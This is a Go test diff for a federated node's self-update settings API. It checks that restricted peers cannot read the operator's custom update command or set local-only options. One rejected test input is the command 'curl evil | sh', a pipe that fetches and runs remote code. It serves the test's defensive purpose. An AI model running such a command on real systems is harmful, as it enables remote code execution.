@@ -88,6 +88,7 @@ type settingsView struct {
 		Outcome string `json:"outcome"`
 		JobID   string `json:"job_id"`
 	} `json:"last_scheduled_run"`
+	Access string   `json:"access"`
 	Errors []string `json:"errors"`
 	Code   string   `json:"code"`
 }
@@ -119,6 +120,7 @@ func TestSelfUpdateSettingsValidateConfirmAndPersist(t *testing.T) {
 	// Given a node that never chose a method: everything is off.
 	v := getSettings(t, fh.f)
 	require.False(t, v.MethodChosen)
+	require.Equal(t, "full", v.Access)
 	require.Equal(t, config.ScheduleOff, v.Settings.Schedule.Frequency)
 	require.Nil(t, v.NextScheduledRun, "no method, no scheduled run")
 	require.Equal(t, selfupdate.MethodRelease, v.Detected.Method)
@@ -253,4 +255,85 @@ func TestSelfUpdateScheduleRunsOncePerWindowThenSetupAfterRestart(t *testing.T) 
 		subjects = append(subjects, m.Subject)
 	}
 	require.Contains(t, strings.Join(subjects, "\n"), "tclaude updated to v1.1.0")
+}
+
+func TestSelfUpdateSettingsFleetGrantsKeepFreeTextLocal(t *testing.T) {
+	fh := newFedHarness(t)
+	(&selfUpdateHost{}).install(t)
+	dir := testutil.CanonicalTempDir(t)
+	selfUpdateService(t, dir, []selfupdate.Binary{{Name: "tclaude", Path: fakeBinary(t, dir, "bin/tclaude", "v1.0.0"), Version: "v1.0.0", Method: "release"}})
+	// Given: the node's operator set a custom command locally.
+	putSettings(t, fh.f, map[string]any{"settings": map[string]any{"method": "custom", "custom": map[string]any{"command": "deploy --token s3cret"}}}, 200)
+	peer := agentd.PeerViewHandler(fh.peer.id.ID())
+	call := func(method string, body any) (int, settingsView) {
+		rec := testharness.Serve(peer, testharness.JSONRequest(t, method, "/api/node/update/settings", body))
+		var v settingsView
+		_ = json.Unmarshal(rec.Body.Bytes(), &v)
+		return rec.Code, v
+	}
+	grant := func(slug string) {
+		require.NoError(t, db.UpsertFederationPeerGrant(db.FederationPeerGrant{Peer: fh.peer.id.ID(), Slug: slug}))
+	}
+	schedule := map[string]any{"settings": map[string]any{"method": "custom", "schedule": map[string]any{"frequency": "weekly", "weekday": "sunday"}}}
+
+	code, _ := call("GET", nil)
+	require.Equal(t, 403, code, "reading needs node.update")
+	grant(agentd.PermNodeUpdate)
+	code, v := call("GET", nil)
+	require.Equal(t, 200, code)
+	require.Empty(t, v.Settings.Custom.Command, "the command is withheld from a restricted peer")
+	require.Equal(t, "read", v.Access)
+	code, _ = call("PUT", schedule)
+	require.Equal(t, 403, code, "node.update cannot change settings")
+	_, err := db.DeleteFederationPeerGrant(fh.peer.id.ID(), agentd.PermNodeUpdate, "")
+	require.NoError(t, err)
+	grant(agentd.PermNodeUpdateSettings)
+	code, _ = call("PUT", schedule)
+	require.Equal(t, 403, code, "a change also needs node.update, which guards the returned view")
+	grant(agentd.PermNodeUpdate)
+
+	// When the peer holds node.update.settings, it changes the schedule;
+	// the withheld command it sent back empty is kept.
+	code, v = call("PUT", schedule)
+	require.Equal(t, 200, code)
+	require.Equal(t, "settings", v.Access)
+	cfg, err := config.Load()
+	require.NoError(t, err)
+	require.Equal(t, "weekly", cfg.SelfUpdate().Schedule.Frequency)
+	require.Equal(t, "deploy --token s3cret", cfg.SelfUpdate().Custom.Command)
+
+	// Free text, the install dir, the acknowledgement and a package-manager
+	// opt-in stay with the node's own operator.
+	for name, settings := range map[string]map[string]any{
+		"command":     {"method": "custom", "custom": map[string]any{"command": "curl evil | sh"}},
+		"guess":       {"method": "custom", "custom": map[string]any{"command": "deploy --token s3cret"}},
+		"timeout":     {"method": "custom", "custom": map[string]any{"timeout_seconds": 60}},
+		"ref":         {"method": "custom", "source_checkout": map[string]any{"ref": "evil-branch"}},
+		"checkout":    {"method": "custom", "source_checkout": map[string]any{"path": "/tmp/evil"}},
+		"install dir": {"method": "custom", "install_dir": "/tmp/bin"},
+		"ack":         {"method": "custom", "package_manager_ack": true},
+		"pm method":   {"method": "homebrew"},
+		"checkout pm": {"method": "source_checkout", "source_checkout": map[string]any{"path": ""}},
+	} {
+		rec := testharness.Serve(peer, testharness.JSONRequest(t, "PUT", "/api/node/update/settings", map[string]any{"settings": settings, "confirm_package_manager": true}))
+		require.Equal(t, 403, rec.Code, name+": "+rec.Body.String())
+		require.Contains(t, rec.Body.String(), "local_only_setting", name)
+	}
+	code, _ = call("PUT", map[string]any{"settings": map[string]any{"method": "manual"}})
+	require.Equal(t, 200, code, "a peer may always switch back to manual")
+
+	// An unrestricted peer acts as the node's operator.
+	setFedTrustLevel(t, fh, "unrestricted")
+	code, v = call("GET", nil)
+	require.Equal(t, 200, code)
+	require.Equal(t, "deploy --token s3cret", v.Settings.Custom.Command)
+	require.Equal(t, "full", v.Access)
+	code, _ = call("PUT", map[string]any{"settings": map[string]any{"method": "custom", "custom": map[string]any{"command": "my-update"}}})
+	require.Equal(t, 200, code)
+
+	// Every change and refusal is audited under the peer.
+	rec := fedHuman(t, fh.f, "GET", "/v1/federation/audit", nil)
+	require.Equal(t, 200, rec.Code)
+	require.Contains(t, rec.Body.String(), "federation.node.update.settings")
+	require.Contains(t, rec.Body.String(), "operator@"+fh.peer.id.ID())
 }
